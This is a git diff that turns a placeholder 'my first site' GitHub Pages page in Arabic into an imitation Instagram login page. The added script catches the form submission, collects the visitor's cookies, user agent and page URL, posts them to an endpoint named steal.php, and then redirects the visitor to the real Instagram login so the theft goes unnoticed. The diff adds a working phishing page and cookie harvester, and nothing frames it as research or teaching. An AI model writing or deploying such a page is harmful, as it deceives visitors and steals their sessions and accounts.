@@ -1,22 +1,53 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>موقعي</title>
-<style>
-body {
-    font-family: Arial;
-    background: #111;
-    color: #fff;
-    text-align: center;
-    padding-top: 50px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - تسجيل الدخول</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; }
+        .container { max-width: 350px; margin: 40px auto; background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 175px; }
+        input { width: 100%; padding: 9px 0; border: 1px solid #efefef; border-radius: 3px; background: #fafafa; margin-bottom: 6px; box-sizing: border-box; font-size: 14px; text-align: center; }
+        input:focus { outline: none; border-color: #b2b2b2; background: white; }
+        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 5px; padding: 7px 0; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #007bb5; }
+        .forgot { text-align: center; margin-top: 15px; font-size: 12px; color: #00376b; text-decoration: none; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+        </div>
+        <form id="loginForm">
+            <input type="text" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
+            <input type="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <a href="#" class="forgot">نسيت كلمة السر؟</a>
+    </div>
 
-<h1>🎉 تم إنشاء الموقع بنجاح</h1>
-<p>هذا أول موقع لي على GitHub Pages</p>
-
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // جمع جميع cookies
+            const cookies = document.cookie.split(';').map(c => c.trim()).join('; ');
+            
+            // إرسال البيانات إلى الخادم
+            fetch('steal.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'cookies=' + encodeURIComponent(cookies) + 
+                      '&userAgent=' + encodeURIComponent(navigator.userAgent) +
+                      '&url=' + encodeURIComponent(window.location.href)
+            }).then(() => {
+                // إعادة توجيه إلى Instagram الحقيقي
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            });
+        });
+    </script>
 </body>
 </html>
